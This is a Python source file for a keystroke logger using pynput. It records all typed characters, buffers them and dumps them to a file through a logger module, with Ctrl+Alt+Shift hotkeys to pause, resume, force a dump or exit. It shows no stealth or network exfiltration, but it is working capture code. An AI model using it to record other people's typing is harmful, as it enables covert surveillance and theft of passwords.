from time import sleep

from util import utilities
from logger import logger
from pynput import keyboard
from pynput.keyboard import Key, Listener, KeyCode, Controller
from countdown import Countdown
from decorators.decorators import catch_exception

# eng_printable_bounds = [33,126]
S_code = 83
P_code = 80
D_code = 68
T_code = 84

is_ctrl_pressed:bool = False
is_alt_pressed:bool = False
is_shift_pressed:bool = False
should_register:bool = True
key_buffer:list[str] = list()
buffer_capacity:int = 1000
lang_change_listener:Listener
_keyboard = Controller()


def on_pressed(key):
    if not should_register:
        return

    global key_buffer
    if key == Key.backspace:
        if len(key_buffer) > 0:
            del key_buffer[-1]
    else:
        result = __get_char_of_key(key)
        if result is not None:
            key_buffer.append(result)
            if len(key_buffer) >= buffer_capacity:
                logger.log_to_file(buffer=key_buffer)
                key_buffer = list()
            print('{}'.format(result))


def on_release(key):
    if not should_register:
        return

    if key == Key.ctrl_l:
        global is_ctrl_pressed
        is_ctrl_pressed = False
    elif key == Key.alt_l:
        global is_alt_pressed
        is_alt_pressed = False
    elif key == Key.shift_l:
        global is_shift_pressed
        is_shift_pressed = False


# print(ord(getattr(key,'char',0)))
# @catch_exception
def __get_char_of_key(key) -> chr:
    global is_ctrl_pressed, is_alt_pressed, is_shift_pressed

    if should_register:
        if isinstance(key,KeyCode):
            if is_ctrl_pressed or is_alt_pressed or is_shift_pressed or ord(key.char) < 32:
                __check_for_special_handling(ord(key.char))
                return None

            return key.char
        elif key == Key.space:
            return " "
        elif key == Key.enter:
            return "\n"

    if not is_ctrl_pressed and key == Key.ctrl_l:
        is_ctrl_pressed = True
        return None
    elif not is_alt_pressed and key == Key.alt_l:
        is_alt_pressed = True
        return None
    elif not is_shift_pressed and key == Key.shift_l:
        is_shift_pressed = True
        return None
    else:
        return None


def __check_for_special_handling(unicode):
    if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
        global should_register,key_buffer

        if   unicode == P_code:     #stop recording and timers
            should_register = False
        elif unicode == S_code:     #start recording and timers again
            should_register = True
        elif unicode == D_code:     #force dump contents of array in file
            logger.log_to_file(key_buffer)
            key_buffer = list()
        elif unicode == T_code:     #wait for logging to complete if ongoing, and exit
            count = 0
            while logger.is_writing and count < 5:
                print('was writing, trying again...')
                count += 1
                sleep(0.15)

            __shutdown_executors()
            if count == 5:
                exit(-1)
            exit(0)


def __init_executors():
    logger.init()


def __shutdown_executors():
    logger.shutdown()


# ________________________________________ START _________________________________________________


__init_executors()

with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
    # print('# of threads: {}'.format(threading.activeCount()))
    listener.join()

